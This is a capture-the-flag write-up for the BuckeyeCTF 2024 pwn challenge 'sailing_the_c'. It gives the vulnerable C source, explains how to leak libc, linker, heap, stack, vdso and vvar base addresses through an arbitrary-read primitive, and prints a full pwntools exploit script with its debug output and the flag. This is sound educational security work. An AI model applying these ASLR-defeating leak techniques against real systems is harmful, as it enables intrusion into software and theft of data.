# sailing_the_c [43 solves]
### Challenge Description
> The king of flags has sent you on a journey across the world with nothing but a pie. Will you prevail?

`nc challs.pwnoh.io 13375`
### Challenge Author 
> Author: corgo
# Challenge Files 
we are given with the source file that was used for compiling the binary.
```c filename=chall.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>


int prepare(){
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
        malloc(0x100);
}

int sail(){
        void *location = 0;
        while (1) {
                puts("Where to, captain?");
                scanf("%zu", &location);
                if (!location) { break; }
                printf("Good choice! We gathered %zu gold coins.\n",*(uint64_t *)location);
        }
        puts("Back home? Hopefully the king will be pleased...");
        sleep(2);
        return 0;
}

int report(){
        FILE* fp;
        char prev[0x100] = {};
        char line[0x200] = {};
        uint64_t base, response;

        puts("\n                     .\n                    / \\\n                   _\\ /_\n         .     .  (,'v`.)  .     .\n         \\)   ( )  ,' `.  ( )   (/\n          \\`. / `-'     `-' \\ ,'/\n           : '    _______    ' :\n
|  _,-'  ,-.  `-._  |\n           |,' ( )__`-'__( ) `.|\n           (|,-,'-._   _.-`.-.|)\n           /  /<( o)> <( o)>\\  \\\n           :  :     | |     :  :\n           |  |     ; :     |  |\n           |  |    (.-.)    |  |\n           |  |  ,' ___ `.  |  |\n           ;  |)/ ,'---'. \\(|  :\n       _,-/   |/\\(       )/\\|   \\-._\n _..--'.-(    |   `-'''-'   |    )-.`--.._\n          `.  ;`._________,':  ,'\n         ,' `/               \\'`.\n              `------.------'          \n                     '\n\n");
        sleep(2);
        puts("While I am impressed with these riches.. you still must prove you sailed the world.");
        sleep(2);

        fp = fopen("/proc/self/maps","r");
        while(fgets(line, sizeof(line), fp)) {
                line[strcspn(line, "\n")] = 0;
                char *filename = strrchr(line,' ')+1;
                if (line[strlen(line)-1] != ' ' && strcmp(filename,prev)){
                        strcpy(prev,filename);
                        base = strtoull(strtok(line, "-"), NULL, 16);
                        printf("Where in the world is %s?\n",filename);
                        scanf("%zu", &response);
                        if (response == base){
                                puts("Correct!");
                        } else {
                                puts("It seems you are not worthy of flaghood.");
                                exit(1);
                        }
                }
        }
        return 0;
}

int accolade(){
        FILE* fp;
        char flag[0x100];

        puts("You have been blessed with flaghood.");
        fp = fopen("./flag.txt","r");
        fgets(flag,sizeof(flag),fp);
        puts(flag);
}

int main(){
        prepare();
        sail();
        report();
        accolade();
        return 0;
}
```

# Solution
## Analysis 
first let's analyse what kind of binary we are dealing with. for some reason when i ran `ldd` on the provided binary, it detected the dependencies as my system binaries. so i had to run `pwninit` to patch the binary.
```bash
fooker@fooker:~/buckeyectf2024/pwn/sailing_the_c$ file chall
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=be44110a4ce11e728f251e36798a53a453b1c2bd, for GNU/Linux 3.2.0, not stripped
fooker@fooker:~/buckeyectf2024/pwn/sailing_the_c$ checksec chall
[*] '~/buckeyectf2024/pwn/sailing_the_c/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
fooker@fooker:~/buckeyectf2024/pwn/sailing_the_c$ ldd chall
        linux-vdso.so.1 (0x00007fff784e2000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ff97f06b000)
        /lib64/ld-linux-x86-64.so.2 (0x00007ff97f2a7000)
fooker@fooker:~/buckeyectf2024/pwn/sailing_the_c$ ldd chall_patched
        linux-vdso.so.1 (0x00007fff37062000)
        libc.so.6 => ./libc.so.6 (0x00007f89c6158000)
        ./ld-2.35.so => /lib64/ld-linux-x86-64.so.2 (0x00007f89c6383000)
fooker@fooker:~/buckeyectf2024/pwn/sailing_the_c$
```
after analysing the binary, i realised thatt we needed to provide it with the base memory addresses of different sections of the binary. we are also allowed to perform an arbitrary read as many times as we want. well, that's interesting!

## Libc Leak
since the given binary is not a position-independent executable, therefore we already have the ELF base address. at a fixed offset, we have the GOT table and the GOT entries could be used to leak the libc addresses. this could be used to get the libc leak! 

## ld Leak
talking about killing two birds with one stone, it turns out that the initial entries of the GOT contain information about the dynamic linker, so that could be used to get the dynamic linker leak!

## Heap Leak
the heap leak could be obtained from the `main arena` which resides in the data section of the `libc`. the main arena stores the location of the current top chunk pointer which would be at a constant offset from the heap base initially.

## vdso and vvar 
i was able to search the page base of `vdso` directly in the binary `search --qword <insert_vdso_page_base>` and the output shows up a couple of addresses in the `ld section`. we could grab these to get `vdso` leak and consequently `vvar` leak since this section is at a constant offset from `vdso base`.

## Stack Leak
to obtain the stack leak, we could exploit the fact that the stack stores `environment variables` on the stack and a pointer to these environment variables resides in both, the `libc` and the `ld`. we could view this directly in `pwndbg`
```bash
pwndbg> p &environ
$1 = (char ***) 0x7ffff7ffe2d0 <environ>
pwndbg> p environ
$2 = (char **) 0x7fffffffda28
```
the problem is that we could deterministically determine the stack page base from this information. we'll have to rely on some educated guesses (read: brute) to determine the stack base. i tried nullifying the three least significant nibbles and tried bruting over the fourth nibble. 

the following yielded the correct stack base
```py
stack_leak = (stack_leak & 0xfff) ^ stack_leak + 0x2000 - 0x21000
```
## vsyscall 
`vsyscall` is a page that is mapped to a static memory address by the kernel and that is just `0xffffffffff600000`

## Full Exploit
piecing up all of the information we know now, we could write out a full exploit that would give us the flag!

```py
#!/usr/bin/env python3

from pwn import *

exe = './chall_patched'
libc_path = './libc.so.6'
ld_path = './ld-2.35.so'

elf = context.binary = ELF(exe, checksec=True)
libc = ELF(libc_path, checksec=False)
ld = ELF(ld_path, checksec=False)

host = 'challs.pwnoh.io'
port = 13375
r = remote(host, port, level='DEBUG')
## r = process(exe, level='DEBUG')

gs = '''

'''

context.log_level = 'debug'

## r = gdb.debug(exe, gdbscript=gs)

puts_got = elf.got['puts']
r.recvuntil(b'Where to, captain?\n')

r.sendline(str(puts_got).encode())
puts_leak = int(r.recvline().strip().decode().split('gathered ')[1].split(' gold')[0], 10)
libc.address = puts_leak - libc.sym['puts']

elf_base = 0x400000
libc_base = libc.address

print(f"libc_base = {libc_base} => in hex: {hex(libc_base)}")

ld_pos = 0x404010
r.recvuntil(b'Where to, captain?\n')

r.sendline(str(ld_pos).encode())
ld_base = int(r.recvline().strip().decode().split('gathered ')[1].split(' gold')[0], 10)
ld_base = ld_base - (0x7f4ca5623d30 - 0x7f4ca560e000)

print(f"ld_base = {ld_base} => in hex: {hex(ld_base)}")

arena_top = libc_base + (0x7f30c7285ce0 - 0x7f30c706b000)
r.recvuntil(b'Where to, captain?\n')

r.sendline(str(arena_top).encode())
heap_base = int(r.recvline().strip().decode().split('gathered ')[1].split(' gold')[0], 10)
heap_base = heap_base - 0x3a0

vdso_pos = (0x7f4ca5649890 - 0x7f4ca560e000) + ld_base
r.recvuntil(b'Where to, captain?\n')

r.sendline(str(vdso_pos).encode())
vdso_leak = int(r.recvline().strip().decode().split('gathered ')[1].split(' gold')[0], 10)
vvar_leak = vdso_leak - 0x4000

stack_pos = libc.sym['environ']
r.recvuntil(b'Where to, captain?\n')

r.sendline(str(stack_pos).encode())
stack_leak = int(r.recvline().strip().decode().split('gathered ')[1].split(' gold')[0], 10)

print(hex(stack_leak))
stack_leak = (stack_leak & 0xfff) ^ stack_leak + 0x2000 - 0x21000
print(hex(stack_leak))

vsyscall = 0xffffffffff600000

r.recvuntil(b'Where to, captain?\n')
r.sendline(str(0).encode())

r.recvuntil(b'?\n')
r.sendline(str(elf_base).encode())

r.recvuntil(b'?\n')
r.sendline(str(heap_base).encode())

r.recvuntil(b'?\n')
r.sendline(str(libc_base).encode())

r.recvuntil(b'?\n')
r.sendline(str(ld_base).encode())

r.recvuntil(b'?\n')
r.sendline(str(stack_leak).encode())

r.recvuntil(b'?\n')
r.sendline(str(vvar_leak).encode())

r.recvuntil(b'?\n')
r.sendline(str(vdso_leak).encode())

r.recvuntil(b'?\n')
r.sendline(str(vsyscall).encode())

r.interactive()
```
running the exploit we have
```bash
fooker@fooker:~/buckeyectf2024/pwn/sailing_the_c$ python3 solve.py
[*] '~/buckeyectf2024/pwn/sailing_the_c/chall_patched'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fe000)
    RUNPATH:  b'.'
[+] Opening connection to challs.pwnoh.io on port 13375: Done
[DEBUG] Received 0x13 bytes:
    b'Where to, captain?\n'
[DEBUG] Sent 0x8 bytes:
    b'4210720\n'
[DEBUG] Received 0x48 bytes:
    b'Good choice! We gathered 139894762634832 gold coins.\n'
    b'Where to, captain?\n'
libc_base = 139894762106880 => in hex: 0x7f3bc999f000
[DEBUG] Sent 0x8 bytes:
    b'4210704\n'
[DEBUG] Received 0x48 bytes:
    b'Good choice! We gathered 139894764481840 gold coins.\n'
    b'Where to, captain?\n'
ld_base = 139894764392448 => in hex: 0x7f3bc9bcd000
[DEBUG] Sent 0x10 bytes:
    b'139894764313824\n'
[DEBUG] Received 0x43 bytes:
    b'Good choice! We gathered 1049297824 gold coins.\n'
    b'Where to, captain?\n'
[DEBUG] Sent 0x10 bytes:
    b'139894764636304\n'
[DEBUG] Received 0x48 bytes:
    b'Good choice! We gathered 140732855472128 gold coins.\n'
    b'Where to, captain?\n'
[DEBUG] Sent 0x10 bytes:
    b'139894764343808\n'
[DEBUG] Received 0x48 bytes:
    b'Good choice! We gathered 140732855067432 gold coins.\n'
    b'Where to, captain?\n'
0x7ffeebd5a328
0x7ffeebd3b000
[DEBUG] Sent 0x2 bytes:
    b'0\n'
[DEBUG] Received 0x31 bytes:
    b'Back home? Hopefully the king will be pleased...\n'
[DEBUG] Received 0x2d0 bytes:
    b'\n'
    b'                     .\n'
    b'                    / \\\n'
    b'                   _\\ /_\n'
    b"         .     .  (,'v`.)  .     .\n"
    b"         \\)   ( )  ,' `.  ( )   (/\n"
    b"          \\`. / `-'     `-' \\ ,'/\n"
    b"           : '    _______    ' :\n"
    b"           |  _,-'  ,-.  `-._  |\n"
    b"           |,' ( )__`-'__( ) `.|\n"
    b"           (|,-,'-._   _.-`.-.|)\n"
    b'           /  /<( o)> <( o)>\\  \\\n'
    b'           :  :     | |     :  :\n'
    b'           |  |     ; :     |  |\n'
    b'           |  |    (.-.)    |  |\n'
    b"           |  |  ,' ___ `.  |  |\n"
    b"           ;  |)/ ,'---'. \\(|  :\n"
    b'       _,-/   |/\\(       )/\\|   \\-._\n'
    b" _..--'.-(    |   `-'''-'   |    )-.`--.._\n"
    b"          `.  ;`._________,':  ,'\n"
    b"         ,' `/               \\'`.\n"
    b"              `------.------'          \n"
    b"                     '\n"
    b'\n'
    b'\n'
[DEBUG] Received 0x54 bytes:
    b'While I am impressed with these riches.. you still must prove you sailed the world.\n'
[DEBUG] Received 0x20 bytes:
    b'Where in the world is /app/run?\n'
[DEBUG] Sent 0x8 bytes:
    b'4194304\n'
[DEBUG] Received 0x27 bytes:
    b'Correct!\n'
    b'Where in the world is [heap]?\n'
[DEBUG] Sent 0xb bytes:
    b'1049296896\n'
[DEBUG] Received 0x44 bytes:
    b'Correct!\n'
    b'Where in the world is /usr/lib/x86_64-linux-gnu/libc.so.6?\n'
[DEBUG] Sent 0x10 bytes:
    b'139894762106880\n'
[DEBUG] Received 0x9 bytes:
    b'Correct!\n'
[DEBUG] Received 0x46 bytes:
    b'Where in the world is /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2?\n'
[DEBUG] Sent 0x10 bytes:
    b'139894764392448\n'
[DEBUG] Received 0x28 bytes:
    b'Correct!\n'
    b'Where in the world is [stack]?\n'
[DEBUG] Sent 0x10 bytes:
    b'140732854939648\n'
[DEBUG] Received 0x27 bytes:
    b'Correct!\n'
    b'Where in the world is [vvar]?\n'
[DEBUG] Sent 0x10 bytes:
    b'140732855455744\n'
[DEBUG] Received 0x9 bytes:
    b'Correct!\n'
[DEBUG] Received 0x1e bytes:
    b'Where in the world is [vdso]?\n'
[DEBUG] Sent 0x10 bytes:
    b'140732855472128\n'
[DEBUG] Received 0x2b bytes:
    b'Correct!\n'
    b'Where in the world is [vsyscall]?\n'
[DEBUG] Sent 0x15 bytes:
    b'18446744073699065856\n'
[*] Switching to interactive mode
[DEBUG] Received 0x2e bytes:
    b'Correct!\n'
    b'You have been blessed with flaghood.\n'
Correct!
You have been blessed with flaghood.
[DEBUG] Received 0x20 bytes:
    b'bctf{4te_3verY_B1t_0f_THe_PIE}\n'
    b'\n'
bctf{4te_3verY_B1t_0f_THe_PIE}

[*] Got EOF while reading in interactive
$
```
## Flag
`bctf{4te_3verY_B1t_0f_THe_PIE}`